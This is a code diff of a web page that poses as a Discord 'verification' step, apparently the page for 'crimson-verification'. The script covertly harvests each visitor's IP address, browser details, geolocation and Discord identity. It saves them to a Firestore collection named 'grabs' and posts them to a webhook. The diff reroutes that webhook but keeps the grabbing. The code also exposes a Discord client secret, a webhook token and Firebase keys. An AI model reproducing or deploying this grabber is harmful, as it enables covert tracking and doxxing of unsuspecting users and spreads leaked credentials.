@@ -74,9 +74,8 @@
   </div>
 
   <script>
-    // ─── CONFIG ─────────────────────────────────────────
     const DISCORD_CLIENT_ID = '1367845417773039687';
-    const REDIRECT_URI     = 'https://crimson-verification.vercel.app';
+    const REDIRECT_URI = 'https://crimson-verification.vercel.app';
     const FIREBASE_CONFIG = {
       apiKey: "AIzaSyDVYhiYuhrHRPYYzxq7LKPW8bf_2obXsiI",
       authDomain: "crimson-66937.firebaseapp.com",
@@ -85,27 +84,23 @@
       messagingSenderId: "425261971902",
       appId: "1:425261971902:web:d2fece6dee8e3e4c7be1ef"
     };
-    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1372025180980777090/XfS5Bp9zGfHckQN0z3pSTGcStjnBQhlU9VIvNgNjHa-yJvE5NFJm9qOAlYoEMhj0cuRB';
 
-    // ─── FIREBASE INIT ──────────────────────────────────
     firebase.initializeApp(FIREBASE_CONFIG);
     const db = firebase.firestore();
 
-    // ─── STATE ───────────────────────────────────────────
     let userIP = null;
     let denyCount = 0;
 
-    // ─── HELPERS ─────────────────────────────────────────
     function show(id) {
       document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
       document.getElementById(id).classList.add('active');
     }
+
     function updateRetryUI() {
       document.getElementById('retry-count').innerText =
         denyCount ? `Denied ${denyCount} time${denyCount>1?'s':''}` : '';
     }
 
-    // grab IP
     async function grabIP() {
       try {
         const res = await fetch('https://api.ipify.org?format=json');
@@ -119,7 +114,6 @@
       updateRetryUI();
     }
 
-    // collect browser info
     function getExtraInfo() {
       return {
         userAgent: navigator.userAgent,
@@ -131,19 +125,17 @@
       };
     }
 
-    // attempt geolocation
     function tryGetLocation() {
       return new Promise(resolve => {
         if (!navigator.geolocation) return resolve({ lat: null, lon: null });
         navigator.geolocation.getCurrentPosition(
           pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
-          ()   => resolve({ lat: null, lon: null }),
+          () => resolve({ lat: null, lon: null }),
           { timeout: 5000 }
         );
       });
     }
 
-    // handle redirect & denial
     async function handleRedirect() {
       const params = new URLSearchParams(window.location.search);
       if (params.has('error')) {
@@ -161,24 +153,22 @@
       await compileAndExport(code);
     }
 
-    // compile data & export
     async function compileAndExport(oauthCode) {
       let discordUserId = 'unknown', discordUsername = 'unknown';
       const extraInfo = getExtraInfo();
-      const geo       = await tryGetLocation();
+      const geo = await tryGetLocation();
 
-      // exchange code → token → user info
       try {
         const tokenRes = await fetch('https://discord.com/api/oauth2/token', {
           method: 'POST',
           headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
           body: new URLSearchParams({
-            client_id:     DISCORD_CLIENT_ID,
+            client_id: DISCORD_CLIENT_ID,
             client_secret: 'qpfyIPK3yAhuSPEKEMdLUKNxakJek_J6',
-            grant_type:    'authorization_code',
-            code:          oauthCode,
-            redirect_uri:  REDIRECT_URI,
-            scope:         'identify'
+            grant_type: 'authorization_code',
+            code: oauthCode,
+            redirect_uri: REDIRECT_URI,
+            scope: 'identify'
           })
         });
         const tokenData = await tokenRes.json();
@@ -187,7 +177,7 @@
             headers: { 'Authorization': `Bearer ${tokenData.access_token}` }
           });
           const userData = await userRes.json();
-          discordUserId   = userData.id;
+          discordUserId = userData.id;
           discordUsername = `${userData.username}#${userData.discriminator}`;
         }
       } catch (e) {
@@ -195,69 +185,52 @@
       }
 
       const fullData = {
-        ip:            userIP || 'unknown',
-        code:          oauthCode,
+        ip: userIP || 'unknown',
+        code: oauthCode,
         discordUserId,
         discordUsername,
         ...extraInfo,
-        latitude:      geo.lat,
-        longitude:     geo.lon,
-        ts:            new Date()
+        latitude: geo.lat,
+        longitude: geo.lon,
+        ts: new Date()
       };
 
-      // save to Firestore
       try {
         await db.collection('grabs').add(fullData);
       } catch (e) {
         console.error('Firestore error', e);
       }
 
-      // send to webhook
       try {
-        await fetch(DISCORD_WEBHOOK, {
+        await fetch('/api/webhook', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            content:
-              `New grab!\n` +
-              `IP: ${fullData.ip}\n` +
-              `Discord: ${discordUsername} (${discordUserId})\n` +
-              `UA: ${extraInfo.userAgent}\n` +
-              `Lang: ${extraInfo.language}\n` +
-              `Platform: ${extraInfo.platform}\n` +
-              `Screen: ${extraInfo.screenResolution}\n` +
-              `Timezone: ${extraInfo.timezone}\n` +
-              `Lat: ${geo.lat}\nLon: ${geo.lon}`
-          })
+          body: JSON.stringify(fullData)
         });
       } catch (e) {
-        console.error('Webhook error', e);
+        console.error('Webhook API error', e);
         show('error-screen');
         setTimeout(() => window.close(), 5000);
         return;
       }
 
-      // done
       show('final-screen');
       setTimeout(() => window.close(), 3000);
     }
 
-    // Discord authorize button
     document.getElementById('authorize-btn').onclick = () => {
       const url = new URL('https://discord.com/api/oauth2/authorize');
       url.search = new URLSearchParams({
-        client_id:    DISCORD_CLIENT_ID,
+        client_id: DISCORD_CLIENT_ID,
         redirect_uri: REDIRECT_URI,
-        response_type:'code',
-        scope:        'identify'
+        response_type: 'code',
+        scope: 'identify'
       });
       window.location.href = url;
     };
 
-    // back-to-auth button
     document.getElementById('back-to-auth').onclick = () => show('auth-screen');
 
-    // kick everything off in order
     window.addEventListener('load', async () => {
       await grabIP();
       await handleRedirect();
